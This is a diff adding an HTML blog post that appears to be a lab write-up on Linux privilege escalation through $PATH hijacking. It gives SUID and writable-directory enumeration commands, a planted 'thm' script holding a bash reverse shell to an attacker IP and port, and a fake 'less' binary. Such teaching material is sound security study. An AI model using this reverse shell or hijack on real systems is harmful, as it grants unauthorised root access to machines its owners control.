@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>$PATH Hijacking - Linux Privilege Escalation - </title><meta name="Description" content="One of the paths to privilege escalation on Linux is a $PATH Hijacking. This post will be showcasing how Kernel Exploit works."><meta property="og:title" content="$PATH Hijacking - Linux Privilege Escalation" />
+<meta property="og:description" content="One of the paths to privilege escalation on Linux is a $PATH Hijacking. This post will be showcasing how Kernel Exploit works." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/linux-privilege-escalation/path-hijacking-linux-privilege-escalation/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-06-27T00:00:00+00:00" /><meta property="og:site_name" content="SecurityNguyen Site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="$PATH Hijacking - Linux Privilege Escalation"/>
+<meta name="twitter:description" content="One of the paths to privilege escalation on Linux is a $PATH Hijacking. This post will be showcasing how Kernel Exploit works."/>
+<meta name="application-name" content="SecurityNguyen">
+<meta name="apple-mobile-web-app-title" content="SecurityNguyen"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/posts/linux-privilege-escalation/path-hijacking-linux-privilege-escalation/" /><link rel="prev" href="/posts/linux-privilege-escalation/cron-jobs-linux-escalation-privilege/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "$PATH Hijacking - Linux Privilege Escalation",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/posts\/linux-privilege-escalation\/path-hijacking-linux-privilege-escalation\/"
+        },"genre": "posts","keywords": "Red Team, Linux","wordcount":  621 ,
+        "url": "\/posts\/linux-privilege-escalation\/path-hijacking-linux-privilege-escalation\/","datePublished": "2023-06-27T00:00:00+00:00","dateModified": "2023-06-27T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nguyen Nguyen"
+            },"description": "One of the paths to privilege escalation on Linux is a $PATH Hijacking. This post will be showcasing how Kernel Exploit works."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">SecurityNguyen</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">SecurityNguyen</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">$PATH Hijacking - Linux Privilege Escalation</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/tryhardnguyen" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nguyen Nguyen</a></span>&nbsp;<span class="post-category">included in <a href="/categories/penetration-testing/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Penetration Testing</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-06-27">2023-06-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;621 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#what-is-a-path">What is a PATH?</a></li>
+    <li><a href="#path-hijacking">$PATH Hijacking</a></li>
+    <li><a href="#masquerading-as-a-legit-command">Masquerading as a Legit command</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Note: If you need to zoom in, you can click on the image.</p>
+<style>
+	.zoom {
+	            transition: transform 0.3s;
+	            cursor: pointer;
+	        }
+	        
+	        .overlay {
+	            position: fixed;
+	            top: 0;
+	            left: 0;
+	            width: 100%;
+	            height: 100%;
+	            background-color: rgba(0, 0, 0, 0.5);
+	            display: none;
+	            justify-content: center;
+	            align-items: center;
+	            z-index: 999;
+	            pointer-events: none;
+	        }
+	        
+	        .zoomed-image {
+	            max-width: 80%;
+	            max-height: 80%;
+	            transition: transform 0.3s;
+	        }
+	        
+	        .zoomed-image.zoomed {
+	            transform: scale(1.5);
+	        }
+</style>
+<h2 id="what-is-a-path">What is a PATH?</h2>
+<p>$PATH in Linux is essentially an environmental variable that tells the operating system where to look for binaries and executable. To print out your path variable, you can put: <code>echo $PATH</code> then it will move left to right finding the executable that it need to execute. Once it find the executable, then it stop and run it. So then what is PATH Hijacking?</p>
+<h2 id="path-hijacking">$PATH Hijacking</h2>
+<p>Essentially what it is trying to find an command that has root privilege either from SUID or if it is a file created from root. Then creating an duplicate version of the command from a writeable folder and putting malicious code (such as spawning a reverse shell) inside of that command and putting the location of the malicious command first in the path so that it is executed first. Think of it like a evil twin brother trying to ruin your life.</p>
+<p>Additional resource I think would help:
+<a href="https://www.youtube.com/watch?v=-4asq6Tldf0&amp;t=750s&amp;ab_channel=IppSec" target="_blank" rel="noopener noreffer ">https://www.youtube.com/watch?v=-4asq6Tldf0&t=750s&ab_channel=IppSec</a></p>
+<p>First, let find if there is any binary that has SUID set. Here is a command that print out the files that have the SUID set and print out the file owner and location of the file.
+<code>find / -type f -perm -04000 -ls 2&gt;/dev/null | awk '{print $3, $5, $6, $NF}'</code>.
+<br>
+<img class="zoom" src="/images/linux_priv_32.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_32.png">
+</div>
+<br>
+The next part is finding area that is writeable. To help our search, this command will be of use: `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
+<br>
+<img class="zoom" src="/images/linux_priv_33.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_33.png">
+</div>
+<br>
+What pop out is that /home/murdoch is hosting a file that has a SUID and area that is writeable. This make a perfect place to stage our attack. Next I will change my current directory to /home/murdoch. When I do ls -l, you can see that murdoch privilege allows anyone to read, write, execute. 
+<br>
+<img class="zoom" src="/images/linux_priv_34.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_34.png">
+</div>
+<br>
+Now, It's time to go into the directory. We have two items: test and thm.py.
+Here is the content of thm.py:
+<br>
+<img class="zoom" src="/images/linux_priv_35.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_35.png">
+</div>
+<br>
+It look like test was created from thm.py. The reason why I said that is because when you try to run ./test -> it say thm not found. So, the next step would be creating a executable called thm with malicious code in it. The first thing I'm going do is create thm by using `touch thm`. After creating thm, I will add these following line:
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">/bin/bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.53.99/6777 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>Note: Replace 10.10.53.99 and 6777 with your attacker ip and port</em></p>
+<p>Then I will do chmod u+x thm and add the current directory to the $PATH using this command:
+<code>export PATH=/home/murdoch:$PATH</code>and <code>echo $PATH</code> to see the updated path.
+<br>
+<img class="zoom" src="/images/linux_priv_36.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_36.png">
+</div>
+<br>
+Now, let's setup our listener and execute ./test. Boom! we got root privilege.
+<br>
+<img class="zoom" src="/images/linux_priv_37.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_37.png">
+</div>
+<br>
+<h2 id="masquerading-as-a-legit-command">Masquerading as a Legit command</h2>
+<p>Here we have a command less. If we do which less -&gt; It will print the directory of where the command is being executed which is /usr/bin/less. But let&rsquo;s say that less had sudo root privilege or even SUID set to it and abuse that opportunity to get root privilege.
+<br>
+<br>
+To do that we first need to find a writeable area that anyone write to. For the sake of example, I will use /home/murdoch. Then I will create file name less and give it read, write, execute (777). Then I will go inside the file and include these following code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">echo</span> <span class="s2">&#34;Hello, you been infected&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since we already added /home/murdoch to our path. Whenever we type less, it will type out: &ldquo;Hello you been infected&rdquo;. Additionally, when we do which less -&gt; The path got change from /usr/bin/less to /home/murdoch/less.
+<br>
+<img class="zoom" src="/images/linux_priv_38.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_38.png">
+</div>
+<br>
+<p>That is all I have to share on PATH Hijacking. Thanks for reading</p>
+<!-- Zoom Animation Feature -->
+<script>
+	const zooms = document.querySelectorAll('.zoom');
+	const overlay = document.querySelector('.overlay');
+	const zoomedImage = document.querySelector('.zoomed-image');
+	
+	zooms.forEach(function(zoom) {
+		zoom.addEventListener('click', function() {
+			overlay.style.display = 'flex';
+			overlay.style.pointerEvents = 'auto';
+			zoomedImage.src = zoom.src;
+			zoomedImage.classList.add('zoomed');
+		});
+	});
+	
+	overlay.addEventListener('click', function() {
+		overlay.style.display = 'none';
+		overlay.style.pointerEvents = 'none';
+		zoomedImage.classList.remove('zoomed');
+	});
+</script></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-06-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/linux-privilege-escalation/path-hijacking-linux-privilege-escalation/" data-title="$PATH Hijacking - Linux Privilege Escalation" data-hashtags="Red Team,Linux"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/posts/linux-privilege-escalation/path-hijacking-linux-privilege-escalation/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/red-team/">Red Team</a>,&nbsp;<a href="/tags/linux/">Linux</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/linux-privilege-escalation/cron-jobs-linux-escalation-privilege/" class="prev" rel="prev" title="Crob Job to Root - Linux Escalation Privilege"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Crob Job to Root - Linux Escalation Privilege</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/tryhardnguyen" target="_blank">Nguyen Nguyen</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
